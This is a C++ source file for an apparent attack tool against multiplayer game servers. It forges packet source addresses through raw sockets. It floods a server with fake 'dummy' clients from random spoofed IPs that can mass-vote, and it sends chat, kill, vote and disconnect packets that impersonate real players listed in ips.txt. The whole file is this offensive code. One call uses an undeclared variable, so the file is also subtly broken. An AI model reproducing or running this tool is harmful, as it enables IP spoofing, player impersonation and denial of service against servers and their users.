#include "stdafx.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <iostream>
#include <fstream>
#include <string>

#include "winsock2.h"
#include "ws2tcpip.h" //IP_HDRINCL is here
#pragma comment(lib,"ws2_32.lib") //winsock 2.2 library

#include "packetgen.h"
#include "api.h"
#include "core.h"
#include "networking.h"

unsigned char buffer[BUFLEN];

int connectedDummies[MAX_CLIENTS];

unsigned int ipDummies[MAX_CLIENTS][MAX_DUMMIES_PER_CLIENT];
unsigned int ipDummiesSrv[MAX_CLIENTS];
int portDummiesSrv[MAX_CLIENTS];

void SendChat(int client, unsigned int srcIp, unsigned short srcPort, unsigned int dstIp, unsigned short dstPort, const char *msg)
{
	if (!CreateSocket(client))
		CloseSocket(client);

	char aMsg[256];
	sprintf_s(aMsg, sizeof(aMsg), "%s", msg);

	Reset(client);
	memset(buffer, 0, BUFLEN);

	int bufferSize = PackSay(client, &buffer[0], aMsg, 0);
	SendData(client, srcIp, srcPort, dstIp, dstPort, (const char*)buffer, bufferSize);
}

void SendKill(int client, unsigned int srcIp, unsigned short srcPort, unsigned int dstIp, unsigned short dstPort)
{
	if (!CreateSocket(client))
		CloseSocket(client);

	Reset(client);
	memset(buffer, 0, BUFLEN);

	int bufferSize = PackKill(client, &buffer[0]);
	SendData(client, srcIp, srcPort, dstIp, dstPort, (const char*)buffer, bufferSize);
}

void SendDisconnect(int client, unsigned int srcIp, unsigned short srcPort, unsigned int dstIp, unsigned short dstPort)
{
	if (!CreateSocket(client))
		CloseSocket(client);

	Reset(client);
	memset(buffer, 0, BUFLEN);

	int bufferSize = PackDisconnect(client, &buffer[0]);
	SendData(client, srcIp, srcPort, dstIp, dstPort, (const char*)buffer, bufferSize);
}

void SendVote(int client, unsigned int srcIp, unsigned short srcPort, unsigned int dstIp, unsigned short dstPort, int v)
{
	if (!CreateSocket(client))
		CloseSocket(client);

	Reset(client);
	memset(buffer, 0, BUFLEN);

	int bufferSize = PackVote(client, &buffer[0], v);
	SendData(client, srcIp, srcPort, dstIp, dstPort, (const char*)buffer, bufferSize);
}

void SendConnectDummies(int client, unsigned int dstIp, unsigned short dstPort, int amount, int vote)
{
	for (int i = 0; i < amount; i++) //generate random ips
		ipDummies[client][i] = inet_addr(GenerateIP());

	for (int i = 0; i < amount;i++) //generate sockets
		if (!CreateSocket_d(client, i))
			CloseSocket_d(client, i);

	connectedDummies[client] = amount;

	ipDummiesSrv[client] = dstIp;
	portDummiesSrv[client] = dstPort;

	unsigned short srcPort = htons(DUMMIES_PORT);

	int bufferSize = 0;

	for (int i = 0; i < amount; i++)
	{
		Reset_d(client, i);

		memset(buffer, 0, BUFLEN);
		bufferSize = PackConnect_d(client, i, &buffer[0]);
		SendData(client, i, ipDummies[client][i], srcPort, dstIp, dstPort, (const char*)buffer, bufferSize);

		memset(buffer, 0, BUFLEN);
		bufferSize = PackClientInfo_d(client, i, &buffer[0]);
		SendData(client, i, ipDummies[client][i], srcPort, dstIp, dstPort, (const char*)buffer, bufferSize);

		memset(buffer, 0, BUFLEN);
		bufferSize = PackReady_d(client, i, &buffer[0]);
		SendData(client, i, ipDummies[client][i], srcPort, dstIp, dstPort, (const char*)buffer, bufferSize);

		memset(buffer, 0, BUFLEN);
		bufferSize = PackSendInfo_d(client, i, &buffer[0]);
		SendData(client, i, ipDummies[client][i], srcPort, dstIp, dstPort, (const char*)buffer, bufferSize);

		memset(buffer, 0, BUFLEN);
		bufferSize = PackEnterGame_d(client, i, &buffer[0]);
		SendData(client, i, ipDummies[client][i], srcPort, dstIp, dstPort, (const char*)buffer, bufferSize);

		// one alive packet right after joining...
		memset(buffer, 0, BUFLEN);
		bufferSize = PackKeepAlive_d(client, i, &buffer[0]);
		SendData(client, i, ipDummies[client][i], srcPort, dstIp, dstPort, (const char*)buffer, bufferSize);
	
		// vote if wanted
		if(vote != 0)
		{
			memset(buffer, 0, BUFLEN);
			bufferSize = PackVote_d(client, j, &buffer[0], vote);
			SendData(client, i, ipDummies[client][i], srcPort, dstIp, dstPort, (const char*)buffer, bufferSize);
		}
	}
}

//even if it's dirty #NOHATE
int GetConnectedDummies(int client)
{
	return connectedDummies[client];
}

void SendDisconnectDummies(int client)
{
	int bufferSize = 0;
	for (int i = 0; i < connectedDummies[client]; i++)
	{
		memset(buffer, 0, BUFLEN);
		bufferSize = PackDisconnect_d(client, i, &buffer[0]);
		SendData(client, i, ipDummies[client][i], htons(DUMMIES_PORT), ipDummiesSrv[client], portDummiesSrv[client], (const char*)buffer, bufferSize);
	}
	connectedDummies[client] = 0;
}

void SendChatDummies(int client, const char *msg)
{
	int bufferSize = 0;
	char aMsg[256];
	sprintf_s(aMsg, sizeof(aMsg), "%s", msg);

	for (int i = 0; i < connectedDummies[client]; i++)
	{
		if (!CreateSocket_d(client, i))
			CloseSocket_d(client, i);

		Reset_d(client, i);
		memset(buffer, 0, BUFLEN);

		bufferSize = PackSay(client, &buffer[0], aMsg, 0);
		SendData(client, i, ipDummies[client][i], htons(DUMMIES_PORT), ipDummiesSrv[client], portDummiesSrv[client], (const char*)buffer, bufferSize);
	}
}

void SendKeepAliveDummies(int client)
{
	int bufferSize = 0;
	for (int i = 0; i < connectedDummies[client]; i++)
	{
		memset(buffer, 0, BUFLEN);
		bufferSize = PackKeepAlive_d(client, i, &buffer[0]);
		SendData(client, i, ipDummies[client][i], htons(DUMMIES_PORT), ipDummiesSrv[client], portDummiesSrv[client], (const char*)buffer, bufferSize);
	}
}

void SendEmoteDummies(int client, int emoticon)
{
	int bufferSize = 0;
	for (int i = 0; i < connectedDummies[client]; i++)
	{
		memset(buffer, 0, BUFLEN);
		bufferSize = PackEmoticon_d(client, i, &buffer[0], emoticon);
		SendData(client, i, ipDummies[client][i], htons(DUMMIES_PORT), ipDummiesSrv[client], portDummiesSrv[client], (const char*)buffer, bufferSize);
	}
}

void SendListIpAll(int client, unsigned int dstIp, unsigned short dstPort)
{
	std::ifstream File("ips.txt");
	if (!File)
	{
		printf("Failed to open ips.txt\n");
		return;
	}

	// loop through the file
	std::string Line;
	while (std::getline(File, Line))
	{
		char aSplit[512][256] = { { 0 } };
		memset(&aSplit, 0, sizeof(aSplit));
		int Split = 0;
		int Char = 0;

		// split the string
		for (unsigned int i = 0; i < strlen(Line.c_str()); i++)
		{
			if (Line.c_str()[i] == ':')
			{
				Split++;
				Char = 0;
				continue;
			}

			aSplit[Split][Char] = Line.c_str()[i];
			Char++;
		}
		SendChat(client, inet_addr(aSplit[0]), htons(atoi(aSplit[1])), dstIp, dstPort, Line.c_str());
	}
}

void SendVoteAll(int client, unsigned int dstIp, unsigned short dstPort, int vote)
{
	std::ifstream File("ips.txt");
	if (!File)
	{
		printf("Failed to open ips.txt\n");
		return;
	}

	// loop through the file
	std::string Line;
	while (std::getline(File, Line))
	{
		char aSplit[512][256] = { { 0 } };
		memset(&aSplit, 0, sizeof(aSplit));
		int Split = 0;
		int Char = 0;

		// split the string
		for (unsigned int i = 0; i < strlen(Line.c_str()); i++)
		{
			if (Line.c_str()[i] == ':')
			{
				Split++;
				Char = 0;
				continue;
			}

			aSplit[Split][Char] = Line.c_str()[i];
			Char++;
		}
		SendVote(client, inet_addr(aSplit[0]), htons(atoi(aSplit[1])), dstIp, dstPort, vote);
	}
}

void SendChatAll(int client, unsigned int dstIp, unsigned short dstPort, const char *msg)
{
	std::ifstream File("ips.txt");
	if (!File)
	{
		printf("Failed to open ips.txt\n");
		return;
	}

	// loop through the file
	std::string Line;
	while (std::getline(File, Line))
	{
		char aSplit[512][256] = { { 0 } };
		memset(&aSplit, 0, sizeof(aSplit));
		int Split = 0;
		int Char = 0;

		// split the string
		for (unsigned int i = 0; i < strlen(Line.c_str()); i++)
		{
			if (Line.c_str()[i] == ':')
			{
				Split++;
				Char = 0;
				continue;
			}

			aSplit[Split][Char] = Line.c_str()[i];
			Char++;
		}
		SendChat(client, inet_addr(aSplit[0]), htons(atoi(aSplit[1])), dstIp, dstPort, msg);
	}
}

void SendKillAll(int client, unsigned int dstIp, unsigned short dstPort)
{
	std::ifstream File("ips.txt");
	if (!File)
	{
		printf("Failed to open ips.txt\n");
		return;
	}

	// loop through the file
	std::string Line;
	while (std::getline(File, Line))
	{
		char aSplit[512][256] = { { 0 } };
		memset(&aSplit, 0, sizeof(aSplit));
		int Split = 0;
		int Char = 0;

		// split the string
		for (unsigned int i = 0; i < strlen(Line.c_str()); i++)
		{
			if (Line.c_str()[i] == ':')
			{
				Split++;
				Char = 0;
				continue;
			}

			aSplit[Split][Char] = Line.c_str()[i];
			Char++;
		}
		SendKill(client, inet_addr(aSplit[0]), htons(atoi(aSplit[1])), dstIp, dstPort);
	}
}

void SendDisconnectAll(int client, unsigned int dstIp, unsigned short dstPort)
{
	std::ifstream File("ips.txt");
	if (!File)
	{
		printf("Failed to open ips.txt\n");
		return;
	}

	// loop through the file
	std::string Line;
	while (std::getline(File, Line))
	{
		char aSplit[512][256] = { { 0 } };
		memset(&aSplit, 0, sizeof(aSplit));
		int Split = 0;
		int Char = 0;

		// split the string
		for (unsigned int i = 0; i < strlen(Line.c_str()); i++)
		{
			if (Line.c_str()[i] == ':')
			{
				Split++;
				Char = 0;
				continue;
			}

			aSplit[Split][Char] = Line.c_str()[i];
			Char++;
		}
		SendDisconnect(client, inet_addr(aSplit[0]), htons(atoi(aSplit[1])), dstIp, dstPort);
	}
}
